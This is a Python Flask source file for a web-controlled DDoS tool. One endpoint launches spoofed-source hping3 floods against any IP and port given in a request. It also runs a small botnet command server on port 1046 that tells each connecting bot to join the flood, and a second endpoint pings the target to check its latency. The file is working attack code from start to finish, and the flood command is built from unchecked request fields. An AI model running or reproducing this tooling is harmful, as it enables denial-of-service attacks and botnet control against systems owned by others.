from flask import Blueprint, request
import signal
import subprocess
import time
import socket
import threading

ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")

@ddosAttack.post("/")
def DDOSAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = int(data["duration"])

    # launch dos on bots using a seperate thread
    bots = threading.Thread(target=botnet, args=(ipAddress, portNumber, packetSize, attackType, duration))
    attack = threading.Thread(target=ddos, args=(ipAddress, portNumber, packetSize, attackType, duration))
    bots.start()
    attack.start()

    # wait for threads to finish
    bots.join()
    attack.join()
    return ""

@ddosAttack.post("/latency")
def checkLatency():
    data = request.get_json()
    ipAddress = data["ipAddress"]

    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    if "time" in line:
        return '[PING SUCCESS] ' + line
    else:
        return '[PING FAILED] ' + line
    
def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration):
    command = "sudo hping3 {attackType} -d {packetSize} --flood --rand-source -p {portNumber} {ipAddress}"
    commandParam = command.format(
        attackType=attackType,
        packetSize=packetSize,
        portNumber=portNumber,
        ipAddress=ipAddress)

    finalCommand = f"{commandParam} --duration {duration}"

    if len(str.encode(finalCommand)) > 0:
        conn.send(str.encode(finalCommand))
        client_response = str(conn.recv(1024), "utf-8")
        print(client_response, end="")

def ddos(ipAddress, portNumber, packetSize, attackType, duration):
    dosCommand = subprocess.Popen(
        ['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress],
        stdout=subprocess.PIPE,
        text=True)
    time.sleep(duration) # carry out attack for specified duration

    try:
        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
    except subprocess.TimeoutExpired:
        print('Timeout occured')

    dosCommand.kill()


def botnet(ipAddress, portNumber, packetSize, attackType, duration):
    bindIp = getIpAddress()
    bindPort = 1046
    servAdd = (bindIp, bindPort)
    
    # create socket to listen
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((servAdd))
    server.listen(5)
    print ("[*] listening on {}:{}".format(bindIp, bindPort))

    max_connections = 2  # Maximum number of concurrent connections

    threads = [] # Create a list to keep track of threads

    start_time = time.time()  # Record the start time

    while (time.time() - start_time) < duration:
        try:
            server.settimeout(duration - (time.time() - start_time))
            conn, addr = server.accept() # accept the connection
            
            # Create a new thread to handle the connection
            client_thread = threading.Thread(target=handleClient, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
            client_thread.start()
            
            threads.append(client_thread) # Store the thread in the list
        except socket.timeout:
            pass

    # Wait for all threads to finish
    for thread in threads:
        thread.join()


def handleClient(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
    # Handle the connection
    print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
    send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
    conn.close()

def getIpAddress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip